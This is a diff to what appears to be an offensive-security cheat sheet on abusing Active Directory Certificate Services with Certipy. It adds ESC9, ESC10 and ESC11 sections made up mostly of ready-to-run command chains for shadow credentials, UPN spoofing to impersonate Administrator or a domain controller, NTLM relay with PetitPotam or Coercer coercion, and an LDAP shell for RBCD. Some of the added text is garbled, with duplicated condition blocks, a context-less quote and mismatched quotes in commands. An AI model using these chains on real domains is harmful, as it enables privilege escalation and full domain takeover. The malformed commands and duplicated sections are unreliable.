@@ -128,8 +128,83 @@ certipy auth -pfx DC.pfx -dc-ip DCIP
 
 ESC9 refers to the new msPKI-Enrollment-Flag value CT_FLAG_NO_SECURITY_EXTENSION (0x80000). If this flag is set on a certificate template, the new szOID_NTDS_CA_SECURITY_EXT security extension will not be embedded. ESC9 is only useful when StrongCertificateBindingEnforcement is set to 1 (default), since a weaker certificate mapping configuration for Kerberos or Schannel can be abused as ESC10 — without ESC9 — as the requirements will be the same.
 
-### ESC10
-### ESC11
+#### Conditions 
+
+- StrongCertificateBindingEnforcement set to 0
+
+#### Requisities
+- GenericWrite over any account A to compromise any account B
+
+
+> This is not a constraint violation, since the Administrator user’s userPrincipalName is Administrator@domain.com and not Administrator.
+
+#### Conditions 
+
+- StrongCertificateBindingEnforcement set to 0
+- Certificate contains the CT_FLAG_NO_SECURITY_EXTENSION flag in the msPKI-Enrollment-Flag value
+- Certificate specifies any client authentication EKU
+
+#### Requisities
+- GenericWrite over any account A to compromise any account B
+
+```bash
+certipy shadow auto -u username@domain.com -p 'password' -account 'targetUsername'
+certipy account update -username ‘username@domain.com’ -p ‘pass’  -user targetUsername -upn Administrator
+certipy req -username ‘targetUsername@domain.com’ -hashes <hashusernameTarget’ -ca <CA NAME> -template <Template Name>
+certipy account update -username ‘username@domain.com’ -p ‘pass’  -user targetUsername -upn ‘targetUsername@domain.com’
+certipy auth -pfx administrator.pfx -domain domain.com
+```
+
+### Weak Certificate Mappings - ESC10
+
+To abuse these misconfigurations, the attacker needs GenericWrite over any account A that is allowed to enroll in a certificate with client authentication to compromise account B (target).
+
+#### Case 1
+
+##### Conditions 
+
+- StrongCertificateBindingEnforcement set to 0
+
+#### Requisities
+- GenericWrite over any account A to compromise any account B
+
+```bash
+certipy shadow auto -u username@domain.com -p 'password' -account 'targetUsername'
+certipy account update -username ‘username@domain.com’ -p ‘pass’  -user targetUsername -upn Administrator
+certipy req -ca ‘any certificate that permits client authentication> -username ‘targetUsername@domain.com’ -hashes <hash targetUsername> 
+certipy account update -username ‘username@domain.com’ -p ‘pass’  -user targetUsername -upn ‘targetUsername@domain.com’
+certipy auth -pfx administrator.pfx -domain domain.com
+```
+
+#### Case 2
+
+##### Conditions 
+
+- CertificateMappingMethods contains UPN bit flag (0x4)
+
+#### Requisities
+- GenericWrite over any account A to compromise any account B without a userPrincipalName property (machine accounts and built-in domain administrator Administrator)
+
+```bash
+certipy shadow auto -u username@domain.com -p 'password' -account 'targetUsername'
+certipy account update -username ‘username@domain.com’ -p ‘pass’  -user targetUsername -upn DC01$@domain.com
+certipy req -ca ‘any certificate that permits client authentication> -username ‘targetUsername@domain.com’ -hashes <hash targetUsername> 
+certipy account update -username ‘username@domain.com’ -p ‘pass’  -user targetUsername -upn ‘targetUsername@domain.com’
+certipy auth -pfx dc01.pfx -dc-ip DCIP -ldap-shell
+```
+
+> One of the available commands for the LDAP shell is set_rbcd which will set Resource-Based Constrained Delegation (RBCD) on the target. So we could perform a RBCD attack to compromise the domain controller.
+
+### Request Encryption is disabled - ESC11
+
+> For domain controllers, we must specify -template DomainController
+
+```bash
+certipy relay -target 'rpc://<DNS>' -ca <CA NAME>
+petitpotam.py listenerIP DCIP #or 
+python3 Coercer.py -t <targetIP or DNS> -u username -p ‘password’ -d domain.com -l listernerIP
+certipy auth -pfx DC.pfx -dc-ip DCIP
+```
 
 ### Shadow Credentials
 
@@ -138,7 +213,7 @@ Shadow credentials attack consist of using the GenericAll or GenericWrite privil
 >  If you can write to the msDS-KeyCredentialLink property of a user/computer, you can retrieve the NT hash of that object.
 
 ```bash
-certipy shadow auto -u khal.drogo@essos.local -p 'horse' -account 'viserys.targaryen'
+certipy shadow auto -u username@domain.com -p 'password' -account 'targetUsername'
 ```
 
 ## CVEs
@@ -160,6 +235,7 @@ certipy account delete -u administrator@domain.com -hashes '<hash obtained>' -us
 
 ### References
 
-- [Bloodhound](https://github.com/ly4k/BloodHound)
-- [Certipy](https://github.com/ly4k/Certipy)
-- [Certipy 2.0: BloodHound, New Escalations, Shadow Credentials, Golden Certificates, and more!](https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6)
+- https://github.com/ly4k/BloodHound
+- https://github.com/ly4k/Certipy
+- https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6
+- https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7
